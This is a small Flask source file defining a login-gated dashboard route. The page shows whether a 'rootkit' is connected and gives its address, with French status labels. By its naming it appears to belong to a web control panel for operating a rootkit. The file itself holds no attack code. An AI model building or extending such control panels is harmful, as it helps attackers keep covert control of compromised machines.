from flask import Blueprint, render_template, redirect, url_for
import utils.state as state

dashboard_bp = Blueprint('dashboard', __name__)

@dashboard_bp.route('/')
def dashboard():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    status = "✅ Connecté" if state.rootkit_connection else "🔴 Déconnecté"
    return render_template("dashboard.html", status=status, rootkit_address=state.rootkit_address)
